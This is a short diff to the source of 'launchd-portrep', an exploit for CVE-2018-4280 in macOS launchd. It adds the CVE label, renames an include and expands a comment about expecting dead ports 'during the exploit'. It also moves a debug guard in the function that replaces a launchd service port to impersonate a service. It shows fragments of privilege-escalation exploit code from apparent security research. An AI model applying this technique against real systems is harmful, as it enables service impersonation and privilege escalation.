@@ -2,6 +2,8 @@
  * launchd-portrep
  * Brandon Azad
  *
+ * CVE-2018-4280
+ *
  *
  * launchd-portrep
  * ================================================================================================
@@ -109,7 +111,7 @@
  *
  */
 
-#include "launchd-portrep.h"
+#include "launchd_portrep.h"
 
 #include "log.h"
 
@@ -223,7 +225,9 @@ launchd_release_send_right_twice(mach_port_t send_right) {
 
 // ---- Replacing a service port in launchd -------------------------------------------------------
 
-// Look up the specified service in launchd, returning the service port.
+// Look up the specified service in launchd, returning the service port. We don't use
+// launchd_lookup_service() because that will log and return an error if the port is
+// MACH_PORT_DEAD, which we expect to happen during the exploit.
 static mach_port_t
 launchd_look_up(const char *service_name) {
 	mach_port_t service_port = MACH_PORT_NULL;
@@ -428,7 +432,6 @@ launchd_replace_service_port(const char *service_name,
 				mach_port_destroy(mach_task_self(), ports[i]);
 			}
 		}
-#if DEBUG_LEVEL(1)
 		// Check if we got back the original service. This happens when launchd owned both
 		// the send and receive rights because the service process hasn't actualy started
 		// up yet. We can't impersonate the real service until after that service claims
@@ -438,6 +441,7 @@ launchd_replace_service_port(const char *service_name,
 			ERROR("%s: Original service restored in launchd!", __func__);
 			ok = false;
 		}
+#if DEBUG_LEVEL(1)
 		// Check if we got something else entirely. This used to happen regularly, but now
 		// that we're pushing the freed port down the freelist it's not as common.
 		if (new_service != MACH_PORT_DEAD && replacement_port == MACH_PORT_NULL) {
